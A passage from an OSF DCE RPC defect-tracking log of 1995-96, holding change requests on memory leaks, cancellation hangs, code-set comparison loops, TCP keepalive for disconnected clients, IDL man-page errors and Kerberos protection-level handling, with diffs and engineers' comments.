rpc__krb_get_tkt), then the rpc_krb_info_p_t structure it allocates is
lost. This is because it does not free it on a failure and the caller 
rpc__dg_execute_call ignores the returned pointer in failure cases.

One was to fix it is to add some free code to the end of
rpc__krb_bnd_set_auth(), something like this should do it:


    if (level != rpc_c_authn_level_none)
    {
        st = rpc__krb_get_tkt (krb_info);
        if (st != rpc_s_ok)
            goto poison;
    }
    st = rpc_s_ok;
poison:
    /* If we failed then free krb_info, otherwise return it to caller */
    if (st != rpc_s_ok) {
        RPC_KRB_INFO_UNLOCK(krb_info);
        rpc__krb_free_info((rpc_auth_info_p_t *) &krb_info);
        *infop = NULL;
    } else {
        *infop = (rpc_auth_info_p_t) &krb_info->auth_info;
        RPC_KRB_INFO_UNLOCK(krb_info);
        krb_info->status = st;
    }
    *stp = st;
    return;
}

This bug seems to be common to user space and the kernel.

The latest code we have is the 1.1 Warranty release, the bug is still
present there.

Steve Lord

------------------------------------------------------------------------------
Steve Lord					voice: +1-612-683-5291
Cray Research Inc				email: lord@cray.com
655F Lone Oak Drive
Eagan, MN, 55121, USA
------------------------------------------------------------------------------

[10/10/96 public]

Fixed in 1.1 maintenance.



CR Number                     : 13086
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 10458
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : removal of rpc__cn_call_local_cancel() causes server hangs
Reported Date                 : 8/30/95
Found in Baseline             : 1.1
Found Date                    : 7/24/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cnassoc.c
Sensitivity                   : public

[8/30/95 public]

(from warnick@hi.com)
 DESCRIPTION:
 
 We have been experiencing frequent hangs in rpc__cn_assoc_receive_frag()
 waiting on an event which is never received.  The server doesn't receive 
 cancellation notification from the client and doesn't setup a cancel 
 timeout.  
 
 We haven't experienced these hangs in DCE1.0.3.  In DCE1.1 a call to
 rpc__cn_call_forward_cancel() was removed from rpc__cn_assoc_send_frag().  
 This appears to have broken a cancellation condition.  OSF will need to 
 address reworking the previous fix (OSFs' CR# 10458) without removing the 
 cancellation code.  Since we haven't experience the problems reported 
 in CR# 10458 the code will be restored to the DCE1.0.3 behavior.
 
 
 REPRODUCIBLE:
 
 Happens intermittently.
 
 
 TEST SOFTWARE DESCRIPTION:
 
 No specific tests.
 
 DESCRIPTION OF WHERE TEST SUCCESSFULLY RAN:
 
Related-file::Added 950724 by warnick:: /build/hiosfm/RCS/dce1.1/src/rpc/runtime/./cnassoc.c,v 8.2
 /build/hiosfm/RCS/dce1.1/src/rpc/runtime/./cnassoc.c,v 8.2
 warnick 1995/07/24 18:28:33 +8 -2
 Reason:  OSDqa12113 removal of rpc__cn_call_local_cancel() causes server hangs
 Fix for OSDqa12113.
 
     *** /tmp/ci.27048..cnassoc.c.27089.1	Mon Jul 24 14:28:37 1995
     --- /tmp/cnassoc.c.27089.2	Mon Jul 24 14:28:38 1995
     ***************
     *** 2200,2209 ****
     --- 2200,2214 ----
                    * Do NOT forward the cancel to the server just record
                    * that it was detected.
                    * Note: this is a copy of rpc__cn_call_local_cancel()
                    * with the call to rpc__cn_call_forward_cancel() removed.
                    */
     + #ifdef hitm
     +             rpc__cn_call_local_cancel (assoc->call_rep,
     +                                        &retry_op,
     +                                        st);
     + #else
                   if (RPC_CALL_IS_CLIENT (((rpc_call_rep_t *) assoc->call_rep)))
                   {
                       /*
                        * Record the cancel that was just detected.
                        */
     ***************
     *** 2221,2230 ****
     --- 2226,2236 ----
                   else
                   {
                       retry_op = false;
                       *st = rpc_s_call_cancelled;
                   }
     + #endif
       
                   RPC_DBG_PRINTF (rpc_e_dbg_cancel, RPC_C_CN_DBG_CANCEL,
                                   ("(rpc__cn_assoc_send_frag) call_rep->%x assoc->%x desc->%x cancel caught\n", 
                                    assoc->call_rep,
                                    assoc,
 
Related-file:::: Resolution 
 DESCRIPTION OF BUG FIX:
 
 Added back the call to rpc__cn_call_local_cancel() in
 rpc__cn_assoc_send_frag() so that rpc__cn_call_forward_cancel() 
 will get called.
 
 REGRESSION TEST SCENARIO:
  
 IFEST tests and stress tests.



CR Number                     : 13049
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Problem in i18n evaluation routines
Interest List CC                [mailname]+
Reported Date                 : 8/22/95
Found in Baseline             : 1.1
Found Date                    : 8/22/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/22/95 public]

This problem is reported by Vicki Pritko in IBM Edicott.  Following is the
defect description of defect 2254 Vicki opened for the problem.


prefix        d
name          2254
reference
abstract      Problem in evaluation routines
duplicate

state         open
severity      2
age           0

compName      rpc_runtime                 answer
release       mvs_r3
envName
level

addDate       95/08/22 08:33:18           assignDate    95/08/22 08:33:18
lastUpdate    95/08/22 08:33:18           responseDate
endDate

ownerLogin    ssk                         originLogin   vickip
ownerName     Sat Kahlon                  originName    Vicki Pritko
ownerArea     G98                         originArea    G98

defectOrigin    OSF11

defectType
defectTrigger   P06_normal_mode
defectSource
defectImpact    04_usability
actvtyWhnFound  03_ICODE
phaseInjected

aparNumber
Level 3 Hours

CA Required?
CA Performed

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------

    95/08/22 08:33:19    open            vickip (Vicki Pritko)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by vickip (Vicki Pritko), 95/08/22 08:33:19, action: open>
The rpc_cs_eval_with_universal and rpc_cs_eval_without_universal
API's have a problem with their evaluation logic.  The API's
retrieve the client and server codesets and then start doing
comparisons.  They do a loop that looks like:

   for (i = 1; i <= method_p->server->count; i++)
   {
       if (model_found)
          break;
       if (method_p->client->codesets[0].c_set
           == method_p->server->codesets[i].c_set)
       {
          do stuff
       }
       if (method_p->server->codesets[0].c_set
           == method_p->client->codesets[i].c_set)
       {
          do stuff
       }
   }

This code is incorrect when the server's count is different than
the client's count.  When the server's count is greater, then we
will go too far in the client's code set list for the second
check...  Or when the client's count is bigger, we might miss
checking a few code sets for equality.  This is an OSF bug.


    <Note by cwang (Cathy Wang), 1996/01/22 16:14:55, action: note>
The fix for this defect should be combined with the fix for the
defect 17941 (OT 13165).  Two files have been modified: runtime/cs_s_eval.c
and cs_s_stub.c.  Following are the diff files:

cs_s_eval.c.diff:

454,480d453
<                       #ifdef IBMOS2  /* CMVC 17912(OT 13049), 17941(OT 13165) */
<                       for (i = 1; i < method_p->server->count; i++)
<                       {
<                          if (smir_true)
<                               break;
<
<                          if (method_p->client->codesets[0].c_set
<                               == method_p->server->codesets[i].c_set)
<                          {
<                               smir_true = 1;
<                               model_found = 1;
<                          }
<                       }
<                       for (i = 1; i < method_p->client->count; i++)
<                       {
<                          if (cmir_true)
<                               break;
<
<                          if (method_p->server->codesets[0].c_set
<                               == method_p->client->codesets[i].c_set)
<                          {
<                               cmir_true = 1;
<                               model_found = 1;
<                          }
<                       }
<
<                       #else
500d472
<                       #endif         /* CMVC 17912, 17941 */
775,801d746
<                       #ifdef IBMOS2  /* CMVC 17912(OT 13049), 17941(OT 13165 </                      for (i = 1; i < method_p->server->count; i++)
<                       {
<                          if (smir_true)
<                               break;
<
<                          if (method_p->client->codesets[0].c_set
<                               == method_p->server->codesets[i].c_set)
<                          {
<                               smir_true = 1;
<                               model_found = 1;
<                          }
<                       }
<                       for (i = 1; i < method_p->client->count; i++)
<                       {
<                          if (cmir_true)
<                               break;
<
<                          if (method_p->server->codesets[0].c_set
<                               == method_p->client->codesets[i].c_set)
<                          {
<                               cmir_true = 1;
<                               model_found = 1;
<                          }
<                       }
<
<                       #else
821d765
<                       #endif         /* CMVC 17912, 17941 */


cs_s_stub.c.diff:

2339,2365d2338
<                            #ifdef IBMOS2  /* CMVC 17912(OT 13049), 17941(OT 3165) */
<                            for (i = 1; i < server->count; i++)
<                            {
<                               if (smir_true)
<                                       break;
<
<                               if (client->codesets[0].c_set
<                                       == server->codesets[i].c_set)
<                               {
<                                       smir_true = 1;
<                                       model_found = 1;
<                               }
<                            }
<                            for (i = 1; i < client->count; i++)
<                            {
<                               if (cmir_true)
<                                       break;
<
<                               if (server->codesets[0].c_set
<                                       == client->codesets[i].c_set)
<                               {
<                                       cmir_true = 1;
<                                       model_found = 1;
<                               }
<                            }
<
<                            #else
2385d2357
<                            #endif         /* CMVC 17912, 17941 */



CR Number                     : 13048
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : nsid
Short Description             : nsid doesn't work on a big-endian machine
Reported Date                 : 8/21/95
Found in Baseline             : 1.1
Found Date                    : 8/21/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : nosupport/nsid/nsicom.idl
					     nosupport/nsid/server.c
Sensitivity                   : public

[8/21/95 public]

(I don't know if this belongs to the rpc component, but since nsid provides
NSI, I'm assigning it to rpc.)

nsid is broken on big-endian machines. Here is the fix.

In nsicom.idl, change:

typedef ISO_MULTI_LINGUAL UNICODE_CHAR_T;

to:

typedef unsigned short UNICODE_CHAR_T;

("unsigned short" is what wchar_t is typedef'ed from on Windows, and
matches Windows' side of UNICODE_CHAR_T.)

In server.c, remove the byte swapping code in
ascii_to_unicode/unicode_to_ascii(). (Look around "BigEndianMachine".)

Note: The endian-ness detection code is bogus. When the typedef matches on
both sides, there is no byte-swapping needed.



CR Number                     : 12934
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpccp, dcecp?, etc
Short Description             : showing towers for unknown protseqs
Reported Date                 : 6/26/95
Found in Baseline             : 1.1
Found Date                    : 6/26/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/26/95 public]


I got the following email from Jonathan.  It shows a specific problem,
but we should address the general case:  drop down to showing a tower if
you get a binding from a protseq your host doesn't understand.

Someone will need to adjust my categorizations, or open related OT's.
---------------------------
From: jec@isoft.com (Jonathan Chinitz)
Problem: inconsistent display of RPC server entry information.

Description: invoking rpccp on same entry in CDS yields different displays
of bindings. rpccp displays only towers (bindings) that it can translate
into strings. So rpccp running on a TCP/UDP node does not display non-TCP
or non-UDP bindings. This could confuse a user/administrator that is
looking at an entry to determine what was exported to it.

Sample output:
(This from the OSF1 node)

rpccp> show server /.:/hosts/aus5/dts-entity

>>> no matching objects found

binding information:

  <interface id>   47b333318000.0d.00.01.dc.6c.00.00.00,0.0
  <string binding> ncadg_ip_udp:166.41.144.245[]
  <string binding> ncacn_ip_tcp:166.41.144.245[]


(This from the VMS node)

rpccp> show server /.:/hosts/aus5/dts-entity
>>> no matching objects found

binding information:

  <interface id>   47b333318000.0d.00.01.dc.6c.00.00.00,0.0
  <string binding> ncacn_dnet_nsp:38.705[]
  <string binding> ncacn_ip_tcp:166.41.144.245[]
  <string binding> ncadg_ip_udp:166.41.144.245[]

Jonathan Chinitz        E: jec@isoft.com
IntelliSoft Corp.        Web: http://www.isoft.com
P.O. Box 2645          V: (508) 635-9070
Acton, MA 01720      F: (508) 635-9210



CR Number                     : 12926
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : The lex parser in csrc does not handle the documented syntax
Reported Date                 : 6/21/95
Found in Baseline             : 1.1
Found Date                    : 6/21/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/21/95 public]

IBM Edicott reported the problem which happened on all platforms.  I am attaching the defect they opened below, Austin also opened cmvc 13399 to track the problem.

  
prefix        d
name          894
reference
abstract      The lex parser in csrc does not handle the documented syntax
duplicate

state         closed
severity      2
age           0

compName      rpc_csrc                    answer        program_defect
release
envName
level

addDate       95/04/17 09:46:00           assignDate    95/05/04 14:33:19
lastUpdate    95/05/31 11:20:13           responseDate  95/05/04 14:34:55
endDate       95/05/31 11:20:13

ownerLogin    vickip                      originLogin   vickip
ownerName     Vicki Pritko                originName    Vicki Pritko
ownerArea     G98G                        originArea    G98G

defectOrigin

defectType      06I_function
defectTrigger   P06_normal_mode
defectSource    05_imported
defectImpact    06_reliability
actvtyWhnFound  04_UT
phaseInjected   03_LLD

aparNumber
Level 3 Hours

tracks:
    releaseName           state           addDate   lastUpdate target
    --------------------- --------------- --------- ---------- ---------------
    mvs_r2                complete        95/05/04  95/05/22

verify:
    type            state           addDate   lastUpdate userLogin
    --------------- --------------- --------- ---------- ---------------
    original        accept          95/05/04  95/05/31   vickip


history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/04/17 09:46:00    open            vickip (Vicki Pritko)
    95/05/04 14:33:19    assign          vickip (Vicki Pritko)
    95/05/04 14:34:56    accept          vickip (Vicki Pritko)
    95/05/15 17:13:32    modify          vickip (Vicki Pritko)
    95/05/22 07:00:09    verify          harlan (Doug Harlan)
    95/05/31 11:20:13    close           vickip (Vicki Pritko)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by vickip (Vicki Pritko), 95/04/17 09:46:00, action: open>
The lex parser in csrc does not handle the documented syntax
for the description parameter in the input csrc text file.
The parser does not correctly parse a description line that
contains an ending continuation with text that continues on
the next line.
This is an OSF defect.  I have contacted Austin and Cathy
Wang is now in charge of this defect down there.

    <Note by vickip (Vicki Pritko), 95/05/04 14:33:19, action: assign>
Old Owner: wasselp
New Owner: vickip



    <Note by vickip (Vicki Pritko), 95/05/04 14:34:56, action: accept>
This defect has been accepted.

    <Note by vickip (Vicki Pritko), 95/05/15 17:13:32, action: modify>
Old DefectType:
New DefectType:  06I_function

Old DefectSource:
New DefectSource:  05_imported

Old PhaseInjected:
New PhaseInjected:  03_LLD



CR Number                     : 12904
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 10110,13023
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : context rundown problems w/TCP
Short Description             : TCP context rundown problem when client connection is terminated catastrophically (i.e. reboot, network disconnect)
Reported Date                 : 6/5/95
Found in Baseline             : 1.0.3
Found Date                    : 04/20/95
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/5/95]

(from Grant Alvis @ IBM )
I would like to revisit Problem Report #21350, which has been closed.  Here
is the info:

The Problem Report I reported, #21350, was closed, with an indication that
the problem had been fixed in DCE 1.1 (OT 10110), and that I could retro-fit
the code into the DCE 1.0.3 code base.  However, after looking at the proposed
fix more closely, I can see that the fix will not solve the problem we are
seeing.  Here is a more detailed explanation (Note this is a CN problem.  DG
works fine):

I have looked at the OSF fix, OT 10110, and it will not fix the problem we are
seeing.  The fix in OT 10110 indicates that it fixes a problem with the server
processing when it cleans up the association and group state machines.  The
server in our case, gets no indication of a client disconnect, so it never does
ANY cleanup.   Therefore, this fix to correct the way the server cleans up will
not help us.  We are not seeing incorrect server cleanup, we are seeing NO
server cleanup.

The problem we are seeing is that when a client is catastrophically
disconnected (ie reboot, network disconnect), the server gets ABSOLUTELY NO
INDICATION that the client has gone away.  I have attached a sniffer to the
network, and when the client machine is violently removed from the network,
the server shows no ip activity.  Also, I compiled the RPC runtime with
-DDEBUG, and set:

RPC_DEBUG=11.3,11.5,11.10,13.1,13.2,13.3 

in order to see any activity on the server side, regarding any cancel
requests, and CN RPC Protocol State Machine activity, and there was none.
The server thinks everything is fine, and that the client is still there.
Subsequent calls to the server from other clients work fine, but the server
will NEVER clean up the association of the disconnected client, and will NEVER
invoke its context rundown routine.

The problem seems to be with the fact that the server does not set the
SO_KEEPALIVE option on its server side sockets, so there is no periodic
checking going on to see if the client is alive.  In a normal client 
disconnect(ie just the client process goes away, not the clients network) 
the clientsnetwork sends an indication to the server that the client has gone 
away. However, when the clients network goes away, the server never gets 
any indication that the client is gone, and without the SO_KEEPALIVE option 
set,the server socket will never get an ETIMEDOUT error.

Client side sockets do have the SO_KEEPALIVE option set, so when a server
is disconnected from the network, the client WILL get an indication that
the server has gone away.  I have tested this scenario, and confirmed that
the client does indeed recognize that the server has disappearred (after
about a 30 second wait)..This scenario can be easily recreated with a simple 
client/server example that uses context handles.  After the client has obtained 
a context handle,and the server is keeping state on the client, either 
a)reboot the clientsystem, or b) disconnect the network cable from the client 
machine.

I have a simple testcase to demonstrate this if required..

[6/8/95]

This same problem is now being seen with idl pipes.  When the client is
disconnected from the server, and the server is doing a pull pipe, it never
detects that the client is gone, and just hangs.  The symptoms are the same,
and the same steps as given previously were used to verify that the same
thing is happening.  

I am raising the severity and priority of this defect, given that it is now
seen as a problem with no workaround by 2 of our customers, and because it
is happening via two different scenarios now.

As with the context handles problem, a simple testcase using a server pull pipe
will recreate the problem, if the client's machine is rebooted, or the client's
machine is abruptly removed from the network (ie pull the network cable).

I have a testcase that demonstrates the problem, if necessary.

[8/18/95 public]

Hello Grant, please check out OT# 13023 and let us know if that fixes
your problem.

[8/22/95]

I am confident that defect 13023 will NOT help with this defect.  The focus
of this defect (12904) is the fact that when the clients NETWORK goes away,
the servers NETWORK gets no indication that the client is gone.  If the servers
network thinks the client connection is still present, then the server process
will NEVER get an indication that it should clean up the stale sockets, because
the server process RPC runtime is not set up to poll inactivity on its sockets.
The reason it works over UDP is because the server is actively pinging the
client to see if it is still around, and if the client doesn't respond after a
certain period of time, the server assumes the client is gone, and cleans up
the stale sockets associated with that client process.  TCP Clients, however,
do not have this problem, because they set the SO_KEEPALIVE option on all
of the sockets they create, so the client will detect a server network crash.
The RPC runtime does not set the SO_KEEPALIVE option on server process sockets
it obtains via an accept() call.

Here is another example of a problem we are having with a customer, that
hopefully will illustrate how large of a problem this is becoming.

This problem is becoming more and more visible.  We have a customer who has
hundreds of DCE clients running on laptop computers.  These laptops are
being used by people who log in and out many times a day, and when they log
out, they just hang up the phone, and/or turn the computer off.  They
are not willing to accept a workaround of "just use UDP".  This customer
has a production cell with over 1000 client machines, and bangs heavily on
DCE at all hours of the day.  The build up of stale sockets causes considerable
memory growth in the server processes, since there is a lot of baggage to
maintain in order to keep track of an association in the RPC runtime.  A DCE
core server will grow to a size of about 50 Meg in a matter of a few days.

[8/22/95 public]

Setting SO_KEEPALIVE on a server socket can be done in
rpc__cn_network_select_dispatch() (right after rpc__naf_set_pkt_nodelay(),
call rpc__socket_set_keepalive()). However, it will take 2 hours and 10
minutes for BSD TCP/IP implementation to notice the disconnection.
Depending on how many client contexts are hanging around, this may not
reduce the process size. Pinging a client makes sense, but it requires the
wire protocol change.

[8/28/95 public]
Bumped up priority to have it addressed promptly.

[09/20/95 public]
After some (off-line) discussion, IBM Digital and OSF all agree that there
is an architectural issue with CN RPC that doesn't detect disconnected
clients quickly enough.  Using SO_KEEPALIVE helps, but the time period is
too long for some (many, all...) environments.  A full resolution of this
is outside of the scope of the current release, and will probably require
protocol changes, AES and compatibility issues, and so on.



CR Number                     : 12876
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : doc
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : command_ref
Short Description             : IDL man page refers to auxiliary files and out-of-line types
Reported Date                 : 5/18/95
Found in Baseline             : 1.1
Found Date                    : 5/18/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : dce_books/command_ref/man1rpc/idl.1rpc
Sensitivity                   : public

[5/18/95 public]

Between the doc sets for 1.0.3 and 1.1, references to the ACF attributes
"in_line" and "out_of_line" were deleted, as were references to the
generation of auxiliary files (*_aux.o).  These changes are not mentioned
anywhere in the 1.1 docs, not even the release notes.  The only mention
that occurs is in the _docs_ section of the 1.0.3 release notes:

>     It is no longer necessary to account for .caux.o or
>     .saux.o files in the link step in Makefiles; the DCE
>     1.0.3 IDL compiler no longer generates these files. However,
>     by setting the environment variable IDL_GEN_AUX_FILES
>     as follows (in C shell):
>     
>         setenv IDL_GEN_AUX_FILES 1
>     
>     you can force IDL to generate empty aux files, thus
>     allowing pre-DCE 1.0.3 Makefiles to be used without
>     alteration with the new IDL compiler.

However, the man page for the 1.1 IDL compiler seems to imply that these
attributes are still valid and that auxiliary files are still generated 
under certain circumstances:

>      NAME
>           idl - Invokes the Interface Definition Language (IDL)
>           compiler
> 
>      SYNOPSIS
>           idl filename [argument] ...
> 
> 
>      ARGUMENTS
>           -client file_type
>                   Determines which client files to generate. If you do
>                   not specify this argument, the compiler generates
>                   all client files. The file types are as follows:
> 
> 
>                   none Does not generate client files.
> 
>                   stub Generates only a client stub file.
> 
>                   aux  Generates only a client auxiliary file. A
>                        client auxiliary file is generated only if the
>                        interface contains any out-of-line or self-
>                        pointing types.
> 
>                   all  Generates client stub and client auxiliary
>                        files. This is the default and is the same as
>                        not specifying the -client argument.
> 
>           -server file_type
>                   Determines which server files to generate. If you do
>                   not specify this argument, the compiler generates
>                   all server files. The file types are as follows:
> 
> 
>                   none Does not generate server files.
> 
>                   stub Generates only a server stub file.
> 
>                   aux  Generates only a server auxiliary file. A
>                        server auxiliary file is generated only if the
>                        interface contains any out-of-line, self-
>                        pointing, or pipe types.
> 
>                   all  Generates server stub and server auxiliary
>                        files. This is the default and is the same as
>                        not specifying the -server argument.

************

>           -caux filename
>                   Specifies a pathname for the client auxiliary file.
>                   When you give a filename, do not give a file
>                   extension; the idl compiler appends .c to the C
>                   source file and .o to the object file.  If you do
>                   not use the -caux argument, the idl compiler appends
>                   _caux.c to the C source file and _caux.o to the
>                   object file.
> 
>           -saux filename
>                   Specifies a pathname for the server auxiliary file.
>                   When you give a filename, do not give a file
>                   extension; the idl compiler appends .c to the C
>                   source file and .o to the object file.  If you do
>                   not use the -caux argument, the idl compiler appends
>                   _saux.c to the C source file and _saux.o to the
>                   object file.

************

>      DESCRIPTION
>           The idl command invokes the IDL compiler to convert an
>           interface definition, written in IDL, into output files. The
>           output files include a header file, server stub file, client
>           stub file, and auxiliary files. The compiler constructs the
>           names of the output files by keeping the basename of the
>           interface definition source file but replacing the filename
>           extension with the new extension (or suffix and extension)
>           appropriate to the newly generated type of output file.  For
>           example, math.idl could produce math_sstub.c or math_sstub.o
>           for the server stub.

************

>      EXAMPLES
>            1.  Invoke  the  IDL  compiler  to  compile  the  interface
>                definition  file  test.idl  and  keep  the  generated C
>                source modules. Only server files are  generated.   The
>                server  stub default filename is overridden by creating
>                a file named test_ss.c for the server stub module.  The
>                server  auxiliary  default  filename  is  overridden by
>                creating  a  file  named  test_sa.c  for   the   server
>                auxiliary module.
> 
>                $ idl test.idl -keep c_source -client none -sstub test_ss.c -saux test_sa.c

If the IDL compiler no longer creates auxiliary files and no longer supports
the in_line and out_of_line ACF attributes, the man page should reflect this.
If this is _not_ the case, then the app dev docs (or at least the release
notes) should clarify what the real behavior of the IDL compiler in DCE 1.1
is.

[5/17/96 public]

This CR is old; it escaped notice up to now because of an in-
correct sub-component value. I'm assigning it to Digital now.



CR Number                     : 12873
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime/dg
Short Description             : DG forwarding code needs to be revised
Reported Date                 : 5/17/95
Found in Baseline             : 1.1
Found Date                    : 5/17/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/17/95 public]

Currently, DG forwarding code is implemented with the assumption that the
forwarder server won't support its own services, except ept and mgmt IFs.
dced broke that assumption and it's erroneously in-line forwarding rdacl
requests with unknown object UUIDs (not registered in EP map). DG
forwarding code needs to be revised.

[05/18/95 public]
We thought we fixed this by having dced maintain a single object
uuid.

[5/18/95 public]

We thought, but we didn't. The forwarder server's single object uuid can
tell whether an incoming request with a non nil object uuid is for the
forwarder server or not. However, if an endpoint is not registered for that
ifspec/object uuid, dced returns rpc_e_fwd_drop and DG runtime tries to
handle it by itself because the ifspec is registerd, as shown in CR#12874.
If dced has returned ept_s_not_registered (because of dced's ifspec, but
the mismatched object uuid), DG runtime still handle it by itself. So, dced
must return rpc_e_fwd_reject in this case (which is the fix for CR#12874).
fwd_reject() has never used before, and its reject status is ugly. I think
that rpc__dg_fwd_pkt() should do better job with ept_s_not_registered.
Anyway, that's why we need to revisit DG forwarding code.

[05/18/95 public]
That makes sense.  Thanks for the explanation.

[2/5/96 public]

Downgraded and changed to the enhancement request because dce1.2.1 dced has
the workaround.



CR Number                     : 12862
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : doc
Inter-dependent CRs           : 12861
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : app_ref
Short Description             : rpc_mgmt_inc_server_princ_name() man page should document the server_princ_name argument need not be free'd in case of error.
Reported Date                 : 5/04/95
Found in Baseline             : 1.1
Found Date                    : 5/04/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : rpc_mgmt_inq_server_princ_name() manpage
Sensitivity                   : public

[5/10/95 public]

        In dtss_service_global_set.c, when the dts server is unable
to call rpc_mgmt_inq_server_princ_name(), it free's the variable
serverPrincName.  The rpc runtime already does this if the calls
fails.  This is undocumented in the rpc_mgmt_inq_server_princ_name() 
man page.

Repeat By:

        Run dtsd in 'bad' conditions so rpc_mgmt_inq_server_princ_name fails
and notice a bad free.

Proposed Solution:

The rpc_mgmt_inq_server_princ_name() man page should document the
fact that the server_pric_name argument does not need to be free'd
if an error occurrs.

[5/17/96 public]

Assigned to HP. The sub-component value was missing up till
now, which is why the CR escaped notice.



CR Number                     : 12857
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 9549
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : protection level being modified by rpc__krb_bnd_set_auth
Reported Date                 : 
Found in Baseline             : 1.1
Found Date                    : 
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/rpc/runtime/krbclt.c
Sensitivity                   : public

[4/6/95 public]

For some reason, in 1.1 code was added to rpc__krb_bnd_set_auth to change
the protection level on a binding handle.  For CN, call is upgraded to packet,
and for DG, connect and call are upgraded to packet.  For one thing, this is
unnecessary, since everywhere in the code where the levels are checked, the
upgrading is done by the code.

It is also incorrect.  Connect level protection is different from call level
protection.

This also is causing the auth_info cache to miss, since the cache check is done
by rpc_binding_set_auth_info before callling rpc__krb_bnd_set_auth, so it's
looking for the original level, but the new auth_info is cached using the
modified level, so only the upgraded level is ever in the cache.

This also would cause servers to see the wrong level from rpc_binding_inq_auth_client.

I don't see any evidence that the change was made in response to a problem (no
OT mentioned in the change records for krbclt.c)  I think the following refers
to this change:

 * Revision 1.1.913.2  1994/08/15  19:04:53  ganni
 *      protection level need to be upgraded to the next higher
 *      supported level, if the given level is not supported.
 *      [1994/08/15  19:01:52  ganni]

[5/4/95 public]

See CR#9549. This makes the implementaion AES compliant. Unfortunately, you
are right about the cache miss. rpc__auth_info_cache_lkup() need to be
fixed. (Probably, we need another operation to inquire the supported
authn_levels?)

[5/8/95 public]
This is still incorrect.  Connect level should not be upgraded to packet
level.  The AES - and the code - define different behavior for these two
levels.

It is also being done in the wrong place.  It should not be done late in
the game by rpc__krb_bnd_set_auth, but should be done up front by
rpc_binding_set_auth_info or a routine it calls.  Then the call to
rpc__auth_info_cache_lkup would not fail, and performance would not
suffer they way it has.

[5/8/95 public]

Why shouldn't the connect level be upgraded to the packet level? AES allows
the implementation to do that. (Of course, the semantics of these two
levels are different.)

As I said in my earlier comment, we will need a new operation in auth EPV
to inquire the supported protection levels for upgrading a level before
calling rpc__auth_info_cache_lkup() because the different authentication
service/protseq combinations have different mapping.

[2/5/96 public]

I'm downgrading this because functionally it still operates correctly.
Cache miss should be fixed later (probably while working on the public
key).



CR Number                     : 12856
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : Aliased full pointers to variable length arrays use the first length encountered.
Reported Date                 : 5/3/95
Found in Baseline             : 1.1
Found Date                    : 5/3/95
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : andi
Transarc Status               : 

[5/3/95 public]

